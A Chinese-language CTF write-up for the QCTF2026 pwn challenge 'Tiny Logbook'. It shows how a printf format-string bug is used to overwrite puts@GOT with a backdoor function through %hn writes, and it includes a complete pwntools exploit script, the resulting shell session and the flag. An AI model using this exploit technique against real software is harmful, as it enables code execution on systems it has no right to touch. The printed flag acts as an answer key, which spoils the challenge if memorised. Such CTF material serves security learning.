---
title: Tiny Logbook（QCTF2026 pwn）
date: 2026-10-21
category: Pwn
tags:
  - CTF
  - Writeup
  - pwn
draft: false
summary: "一本小日志本，坏消息只能写，好消息是写的东西可以返回一些其他内容"
collection: QCTF2026
---
# Tiny Logbook

## 第一节：题目

一本小日志本，坏消息只能写，好消息是写的东西可以返回一些其他内容
## 第二节：过程

我们先上手玩一下这个
```bash
Tiny Logbook v1.0
1. write log
2. quit
> 1
content:
123
preview:
[guest] 123

saved
1. write log
2. quit
> 2
bye
```
可以看到我们只能在write log里面写东西，那突破口就在写的内容上了
接下来我们做个小测试，看看程序拿到我们输入的内容之后，是怎么处理的
```bash
content:
%p.%p.%p.%p.%p.%p
preview:
[guest] 0x1.0x1.0x7fe187a118c7.0x8.(nil).0x205d74736575675b
```
非常关键的地方！printf把我的输入当作格式串来用了，也就是说我可以读到一些不该给我看的内存。
顺便，最后的0x205d74736575675b拆开就是[guest]+空格，说明这八个字符就在栈上，和我的输入是放一起的，他们共享一个缓冲区

接下来定位自己的位置，看看输出是否有偏移，为我们后面构造payload做准备
```bash
1. write log
2. quit
> 1
content:
%7$p
preview:
[guest] 0x70000a0d70243725

saved
1. write log
2. quit
> 1
content:
AAAA%7$p
preview:
[guest] AAAA0x7024372541414141
```
而4141414125372470按高位到低位读对应的就是AAAA%7$p这八个字节，说明完全没有偏移
我们现在已经有了一个大致的思路：我们来控制程序的调用，看看指针表可不可写，看看这张表的地址是不是固定的，这边使用了python来直接测试
```python
from pwn import *
e = ELF('chall', checksec=False)
print('PIE   :', e.pie)
print('RELRO :', e.relro)
print('puts@GOT        :', hex(e.got['puts']))
print('emergency_console:', hex(e.symbols['emergency_console']))
```
返回的内容是
```
PIE   : False
RELRO : Partial
puts@GOT        : 0x404028
emergency_console: 0x4013aa
```
PIE False说明了加载地址是固定的
RELRO Partial说明了GOT表可写，和下面 puts@GOT: 0x404028 联系在了一起，就相当于是告诉你了这个地址是可写的，而emergency_console——是一个后门函数，因为PIE 关闭所以可以直接引用，而函数本身是这样的
![](/assets/posts/qctf2026/qctf2026-pwn-tiny-logbook-1.png)

也就是说，这道题我们可以通过把原本正常跳转到puts@GOT存放的地址改成emergency_console，然后可能就可以拿到shell了

有一个办法可以让我们定位到4013AA——这个emergency_console这里，那就是%n 它的作用是把目前为止打印的字符总和写到参数指向的地址
比如
```c
printf("%50000c%n", 'A', &x);  
```
 x最终就等于50000
 但是你会发现，如果我们要定位到4013AA，那我们要输出四百多万个空格，太大了，所以我们这里使用了%hn写低16位，把四个字节拆成三个2字节，不过为什么是三个而不是两个呢？因为puts@GOT里存的puts的真实地址是0x00007f6dxxxxxxxx而emergency是0x00000000004013aa，也就是我们还要把前面的7f6d给改成0000
 也就是我们要的目标字段是
 0000 0040 13aa
 这样从小到大排序，到了一个地方就写一个（因为%hn只增不减的特性），就行了
 最后我们来构造payload，不过由于0x404028拆成字节是 28 40 40 00 00 00 00 00，中间有 \x00——printf把格式串当C字符串，遇到\0就截断了，后面的%hn就不会被解析。所以地址不能放末尾然后用绝对索引引用。
不过最后的payload因为有几万个空格所以手打打肯定是不行的，我们用了python
```python
from pwn import *
io = remote("host", port)      # 换成实际拿到的host和port
io.recvuntil(b"> "); io.sendline(b"1"); io.recvuntil(b"content:")

p  = b"%65528c%12$hn" + b"%64c%13$hn" + b"%4970c%14$hn" + b"AAAAA"
p += p64(0x40402c) + p64(0x40402a) + p64(0x404028)
assert len(p) == 64

io.send(p + b"\n")
io.interactive()

```
然后再返回了几万个空格之后，我们就可以ls之后cat flag了
```bash
echo PWNED
PWNED
ls
bin
boot
dev
etc
flag
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cat flag
QCTF{e01a558a-17d9-4674-aa03-4efccefbc6c9}
```
复现之后的flag
`QCTF{e01a558a-17d9-4674-aa03-4efccefbc6c9}`